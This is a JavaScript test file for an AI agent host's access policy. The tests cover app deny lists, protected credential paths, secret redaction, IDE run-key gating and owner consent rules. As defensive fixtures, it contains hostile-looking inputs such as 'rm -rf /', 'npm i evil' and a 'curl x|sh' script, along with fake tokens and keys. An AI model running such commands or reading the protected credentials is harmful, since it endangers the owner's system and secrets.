// 0.5.2 stage 1 — central access policy (pure). Covers N-01, N-02, N-04, IDE decision, N-05 launch rule.
import test from 'node:test';
import assert from 'node:assert/strict';
import {HARD_DENY} from './capabilities.mjs';
import {classifyApp, adminPage, launchableExe, isProtectedPath, resourceDecision, redactSecrets, classifyIdeInput,
  isExecutorFile, executorSnapshot, approvedCommandDecision, writeDecision, makeConsent, decideConsent, consentCovers,
  notepadLaunchDecision} from './policy.mjs';

const cls = (p, o) => classifyApp(p, o).cls;

test('N-01: ordinary installed apps need no allowlist; unknown/empty process fails closed', () => {
  for (const p of ['Notepad', 'CalculatorApp', 'msedge', 'chrome.exe', 'firefox', 'WINWORD', 'EXCEL', 'gimp-2.10', 'Photoshop', 'Telegram', 'Spotify'])
    assert.deepEqual(classifyApp(p), {cls: 'ordinary', level: 1}, p);
  assert.equal(classifyApp('').cls, 'deny');
  assert.equal(classifyApp(null).cls, 'deny');
});

test('N-01: regression vs 0.5.1 HARD_DENY — only owner-approved moves are relaxed', () => {
  // Moved out of the hard ban by owner decisions (02.11.2026): explorer (N-02 protected-folder rules), IDEs (ide class),
  // admin UIs (page-level bans), password managers (protected = level 2, still never read without consent).
  const moved = {explorer: 'file_manager', code: 'ide', cursor: 'ide', systemsettings: 'admin', control: 'admin', taskmgr: 'admin',
    mmc: 'admin', bitwarden: 'protected', keepass: 'protected', keepassxc: 'protected', '1password': 'protected',
    lastpass: 'protected', dashlane: 'protected', keeper: 'protected'};
  for (const p of HARD_DENY) {
    const c = classifyApp(p);
    if (moved[p]) assert.equal(c.cls, moved[p], p);
    else assert.equal(c.cls, 'deny', `${p} must stay denied`);
  }
});

test('N-01: shells, UAC, NEXUS runtime, ApplicationFrameHost (hosts Settings frames) stay denied → handoff', () => {
  for (const p of ['cmd', 'PowerShell.exe', 'pwsh', 'WindowsTerminal', 'wsl', 'consent', 'CredentialUIBroker', 'LogonUI', 'node', 'java', 'cloudflared', 'ApplicationFrameHost', 'regedit'])
    assert.deepEqual([cls(p), classifyApp(p).level], ['deny', 'handoff'], p);
});

test('N-01: mmc only for Device Manager / Event Viewer; other snap-ins → handoff', () => {
  assert.equal(classifyApp('mmc', {title: 'Device Manager'}).level, 1);
  assert.equal(classifyApp('mmc', {title: 'Просмотр событий'}).level, 1);
  for (const title of ['Services', 'Local Group Policy Editor', 'Certificates - Current User', '', 'Computer Management'])
    assert.equal(classifyApp('mmc', {title}).level, 'handoff', title);
  assert.equal(classifyApp('mmc', {title: 'Services — Device Manager'}).level, 'handoff', 'title must START with the allowed console');
});

test('N-01: Settings/Control Panel security & account pages are level 3; ordinary pages level 1', () => {
  for (const [p, title] of [['SystemSettings', 'Display'], ['SystemSettings', 'Bluetooth & devices'], ['control', 'Sound'], ['taskmgr', 'Processes']])
    assert.equal(adminPage(p, {title}).level, 1, title);
  for (const title of ['Windows Security', 'Privacy & security', 'Sign-in options', 'Accounts', 'Smart App Control', 'Для разработчиков', 'Windows Update', 'Firewall'])
    assert.equal(adminPage('SystemSettings', {title}).level, 3, title);
  assert.equal(adminPage('SystemSettings', {title: 'System', breadcrumb: 'System > Recovery'}).level, 3);
  assert.equal(adminPage('Notepad', {title: 'Accounts'}), null);
});

test('N-01: launchable exe — absolute local .exe, never a denied process or UNC', () => {
  assert.equal(launchableExe('C:\\Program Files\\GIMP 2\\bin\\gimp-2.10.exe'), true);
  assert.equal(launchableExe('C:\\Users\\a\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe'), true);
  for (const e of ['C:\\Windows\\System32\\cmd.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '\\\\srv\\share\\x.exe',
    'relative\\x.exe', 'C:\\x\\run.bat', 'C:\\x\\a.ps1', 'C:\\Windows\\System32\\mshta.exe', 'C:\\x\\a.exe\0', 42])
    assert.equal(launchableExe(e), false, String(e));
});

test('N-02: protected paths — dirs, secret files, extensions, names, owner roots; ordinary files are not', () => {
  for (const p of ['C:\\Users\\a\\.ssh\\id_ed25519', 'C:\\Users\\a\\.ssh', 'C:\\Users\\a\\.ssh\\', 'C:\\Users\\a\\.aws\\credentials',
    'C:\\Users\\a\\.nexus-host\\capabilities.json', 'D:\\proj\\.env', 'D:\\proj\\.env.local', 'D:\\proj\\.dev.vars', 'D:\\proj\\.npmrc',
    'C:\\Users\\a\\AppData\\Roaming\\Bitwarden\\data.json', 'E:\\vault.kdbx', 'C:\\certs\\server.PFX', 'C:\\k\\deploy.pem',
    'C:\\Users\\a\\Desktop\\owner-passphrase.txt', 'C:\\Users\\a\\Desktop\\Пароли.docx', 'C:\\x\\github-token.txt',
    'C:\\Users\\a\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'])
    assert.ok(isProtectedPath(p), p);
  for (const p of ['C:\\Users\\a\\Documents\\report.docx', 'D:\\proj\\src\\index.js', 'D:\\proj\\README.md', 'C:\\Users\\a\\Pictures\\cat.jpg',
    'D:\\proj\\environment.md', 'D:\\proj\\keyboard.js', 'D:\\proj\\src\\tokenizer.js', 'D:\\proj\\db\\seed.sql', 'D:\\proj\\src\\password-reset.ts', 'D:\\proj\\tokenizer\\', 'D:\\proj\\.envoy\\cfg.txt'])
    assert.equal(isProtectedPath(p), null, p);
  const roots = ['C:\\Users\\a\\Documents\\Личное'];
  assert.equal(isProtectedPath('C:\\Users\\a\\Documents\\Личное\\скан паспорта.pdf', roots).reason, 'owner_marked');
  assert.equal(isProtectedPath('c:/users/a/documents/личное', roots).reason, 'owner_marked');
  assert.equal(isProtectedPath('C:\\Users\\a\\Documents\\Личное2\\x.pdf', roots), null, 'prefix must be a whole path segment');
});

test('N-02 matrix: open folder ≠ read files; copy/modify are single-use level 2', () => {
  const dir = 'C:\\Users\\a\\.ssh';
  for (const op of ['navigate', 'open_window']) assert.deepEqual(resourceDecision(op, dir), {level: 1, protected: true, redact: true, reason: 'secret_dir'}, op);
  for (const op of ['list', 'read', 'preview']) assert.deepEqual([resourceDecision(op, dir + '\\id_rsa').level, resourceDecision(op, dir + '\\id_rsa').singleUse], [2, false], op);
  for (const op of ['copy', 'send', 'modify', 'delete']) assert.deepEqual([resourceDecision(op, dir + '\\id_rsa').level, resourceDecision(op, dir + '\\id_rsa').singleUse], [2, true], op);
  assert.deepEqual(resourceDecision('read', 'D:\\proj\\src\\a.js'), {level: 1, protected: false});
  assert.equal(resourceDecision('exfiltrate', 'D:\\a').level, 'handoff');
});

test('N-02/N-09: secret filter for tool output, terminal text and logs', () => {
  const samples = ['token: ghp_' + 'A'.repeat(36), 'github_pat_' + 'B1_'.repeat(10), 'OPENAI_API_KEY=sk-proj-' + 'x'.repeat(30),
    'aws AKIAABCDEFGHIJKLMNOP', 'Authorization: Bearer ' + 'abc.DEF_123-'.repeat(3), 'password = hunter2xyz', 'пароль: Секрет123',
    '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk\n-----END OPENSSH PRIVATE KEY-----', 'jwt eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.SflKxwRJSMeKKF2QT4fwpM'];
  for (const s of samples) {
    const r = redactSecrets(s);
    assert.ok(r.redacted >= 1, s);
    assert.ok(!/hunter2xyz|Секрет123|AKIAABCD|ghp_AAAA|sk-proj-xxx|b3BlbnNzaC1rZXk|SflKxwRJ/.test(r.text), r.text);
  }
  assert.deepEqual(redactSecrets('npm test → 12 passing, 0 failing'), {text: 'npm test → 12 passing, 0 failing', redacted: 0});
  assert.equal(redactSecrets('api_key=abcd1234').text, 'api_key=«redacted»', 'key name kept for context');
});

test('IDE: run keys and command contexts are arbitrary_command (level 3); editing code is autonomous', () => {
  for (const keys of ['F5', 'ctrl+f5', 'ctrl+shift+b', 'ctrl+shift+p', 'ctrl+`', 'ctrl+shift+`', 'f1'])
    assert.equal(classifyIdeInput({keys}).level, 3, keys);
  for (const name of ['Terminal 1, powershell', 'Терминал 2, pwsh', 'Type the name of a command to run.', 'Debug Console', 'Select the task to run'])
    assert.equal(classifyIdeInput({text: 'rm -rf /', elem: {controlType: 'Edit', name}}).level, 3, name);
  assert.equal(classifyIdeInput({text: 'Preferences', elem: {controlType: 'Edit', name: 'Search files by name', value: '>Preferences'}}).level, 3);
  const editor = {controlType: 'Edit', name: 'Editor content;Press Alt+F1 for Accessibility Options.'};
  assert.equal(classifyIdeInput({text: 'const a = 1;\nconst b = 2;\n', elem: editor}).level, 1);
  assert.equal(classifyIdeInput({keys: 'enter', elem: editor}).level, 1);
  assert.equal(classifyIdeInput({keys: 'ctrl+s', elem: editor}).level, 1);
});

test('IDE fail-closed: Enter / multi-line text outside a positively identified editor → level 3', () => {
  for (const elem of [undefined, {controlType: 'Edit', name: ''}, {controlType: 'Edit', name: 'Search'}, {controlType: 'Pane', name: 'Explorer'}]) {
    assert.equal(classifyIdeInput({keys: 'enter', elem}).level, 3, JSON.stringify(elem));
    assert.equal(classifyIdeInput({text: 'npm i evil\n', elem}).level, 3, JSON.stringify(elem));
  }
  assert.equal(classifyIdeInput({text: 'findme', elem: {controlType: 'Edit', name: 'Search'}}).level, 1, 'typing a search query is fine');
});

test('IDE: executor files — anything the toolchain runs', () => {
  for (const f of ['package.json', 'sub/package.json', 'package-lock.json', '.npmrc', '.git/hooks/pre-commit', '.git/config', '.vscode/tasks.json',
    '.vscode/launch.json', '.vscode/settings.json', '.github/workflows/ci.yml', 'Makefile', 'pyproject.toml', 'conftest.py', 'build.ps1',
    'run.CMD', 'x.bat', 'scripts\\deploy.sh', '.husky/pre-push', '.devcontainer/devcontainer.json', 'requirements-dev.txt'])
    assert.equal(isExecutorFile(f), true, f);
  for (const f of ['src/index.js', 'src/package.md', 'test/a.test.mjs', 'README.md', '.vscode/notes.md', 'docs/Makefile.md'])
    assert.equal(isExecutorFile(f), false, f);
});

test('IDE: approved command autonomous only while executor files are unchanged since owner consent', () => {
  const base = [{path: 'package.json', content: '{"scripts":{"test":"node --test"}}'}, {path: 'src/a.js', content: '1'}];
  const snap = executorSnapshot(base);
  assert.deepEqual(Object.keys(snap), ['package.json']);
  assert.deepEqual(approvedCommandDecision(snap, executorSnapshot(base)), {level: 1, changed: []});
  assert.deepEqual(approvedCommandDecision(snap, executorSnapshot([...base.slice(1), {path: 'package.json', content: '{"scripts":{"test":"curl x|sh"}}'}])),
    {level: 3, reason: 'executor_files_changed', changed: ['package.json']});
  assert.deepEqual(approvedCommandDecision(snap, executorSnapshot([...base, {path: '.git/hooks/pre-commit', content: 'x'}])).changed, ['.git/hooks/pre-commit']);
  assert.equal(approvedCommandDecision(snap, executorSnapshot(base.slice(1))).level, 3, 'removal counts too');
  assert.equal(approvedCommandDecision(null, snap).reason, 'no_owner_snapshot');
  // ordinary source edits do not trigger handoff (documented: local run still executes agent-written code)
  assert.equal(approvedCommandDecision(snap, executorSnapshot([base[0], {path: 'src/a.js', content: '2'}])).level, 1);
});

test('IDE: NEXUS writing an executor file needs level 3 with diff; protected file stays level 2', () => {
  assert.deepEqual(writeDecision('src/a.js'), {level: 1});
  assert.deepEqual(writeDecision('.vscode/tasks.json'), {level: 3, reason: 'executor_file_write', showDiff: true});
  assert.equal(writeDecision('D:\\proj\\.env').level, 2);
});

test('N-04: consent covers exactly one action+object; level 3 single-use; expiry; no blanket reuse', () => {
  let t = 1000;
  const c = makeConsent({level: 2, action: 'read', object: 'C:/Users/a/.aws/credentials', consequences: 'текст файла уйдёт в модель', purpose: 'настроить aws cli', singleUse: false}, t);
  assert.equal(consentCovers(c, {action: 'read', object: 'C:/Users/a/.aws/credentials'}, t), false, 'pending must not cover');
  decideConsent(c, 'allow', t + 1);
  assert.equal(consentCovers(c, {action: 'read', object: 'C:/Users/a/.aws/credentials'}, t + 2), true);
  assert.equal(consentCovers(c, {action: 'read', object: 'C:/Users/a/.aws/config'}, t + 3), false, 'other object');
  assert.equal(consentCovers(c, {action: 'copy', object: 'C:/Users/a/.aws/credentials'}, t + 4), false, 'other action');
  assert.equal(consentCovers(c, {action: 'read', object: 'C:/Users/a/.aws/credentials'}, t + 11 * 60_000), false, 'expired');

  const k = makeConsent({level: 3, action: 'arbitrary_command', object: 'npm publish', consequences: 'публикация пакета', singleUse: false}, t);
  assert.equal(k.singleUse, true, 'level 3 is always single-use');
  decideConsent(k, 'allow', t);
  assert.equal(consentCovers(k, {action: 'arbitrary_command', object: 'npm publish'}, t), true);
  assert.equal(consentCovers(k, {action: 'arbitrary_command', object: 'npm publish'}, t), false, 'second use');

  const d = makeConsent({level: 3, action: 'x', object: 'y', consequences: 'z'}, t);
  decideConsent(d, 'deny', t);
  assert.equal(consentCovers(d, {action: 'x', object: 'y'}, t), false);
  assert.throws(() => decideConsent(d, 'allow', t), /already_decided/);
  assert.throws(() => decideConsent(makeConsent({level: 3, action: 'x', object: 'y', consequences: 'z'}, t), 'allow', t + 121_000), /expired/);
  assert.throws(() => makeConsent({level: 1, action: 'x', object: 'y', consequences: 'z'}), /level_invalid/);
  assert.throws(() => makeConsent({level: 2, action: 'read', object: '', consequences: 'z'}), /field_missing: object/);
});

test('N-05/A-02: Notepad is never cold-started for tests; warm start redacts foreign tabs', () => {
  assert.deepEqual(notepadLaunchDecision({running: true}), {level: 1, redactForeignTabs: true});
  assert.equal(notepadLaunchDecision({running: false}).level, 'handoff');
  assert.equal(notepadLaunchDecision({running: undefined}).reason, 'notepad_state_unknown');
});

test('stage 2 appGate: policy vs allowlist mode, owner block, protected focus vs read, security pages', async () => {
  const {appGate, classifyIdeClick} = await import('./policy.mjs');
  const caps = {appAccess: 'policy', blockedApps: ['Spotify'], inputApps: ['Notepad']};
  assert.deepEqual(appGate(caps, 'chrome'), {allow: true, cls: 'ordinary'});
  assert.equal(appGate(caps, 'spotify.exe').error, 'blocked_by_owner');
  assert.equal(appGate(caps, '').error, 'target_unknown');
  assert.deepEqual([appGate(caps, 'cmd').error, appGate(caps, 'cmd').reason], ['owner_handoff_required', 'hard_deny']);
  assert.equal(appGate(caps, 'Bitwarden', {mode: 'focus'}).allow, true);
  assert.deepEqual([appGate(caps, 'Bitwarden', {mode: 'read'}).consent, appGate(caps, 'Bitwarden').what], [2, 'protected_app']);
  assert.equal(appGate(caps, 'SystemSettings', {title: 'Display'}).allow, true);
  assert.deepEqual([appGate(caps, 'SystemSettings', {title: 'Windows Security'}).consent, appGate(caps, 'SystemSettings', {title: 'Windows Security', mode: 'read'}).allow], [3, true]);
  const legacy = {...caps, appAccess: 'allowlist'};
  assert.equal(appGate(legacy, 'Notepad').allow, true);
  assert.equal(appGate(legacy, 'chrome').error, 'not_in_allowlist');
  for (const name of ['Run', 'Run and Debug', 'Start Debugging (F5)', 'Run Task', 'Запустить', '▶']) assert.equal(classifyIdeClick({controlType: 'Button', name}).level, 3, name);
  for (const name of ['Explorer', 'Source Control', 'Runtime.md', 'Close']) assert.equal(classifyIdeClick({controlType: 'Button', name}).level, 1, name);
  assert.equal(classifyIdeClick({controlType: 'Text', name: 'Run'}).level, 1, 'plain text is not a control');
});

test('stage 2 IDE: Enter on a file-tree/list row is autonomous unless the row is a command', () => {
  assert.equal(classifyIdeInput({keys: 'enter', elem: {controlType: 'TreeItem', name: 'server.mjs'}}).level, 1);
  assert.equal(classifyIdeInput({keys: 'enter', elem: {controlType: 'ListItem', name: 'policy.test.mjs, nexus-host'}}).level, 1);
  assert.equal(classifyIdeInput({keys: 'enter', elem: {controlType: 'ListItem', name: 'Tasks: Run Task'}}).level, 3);
});
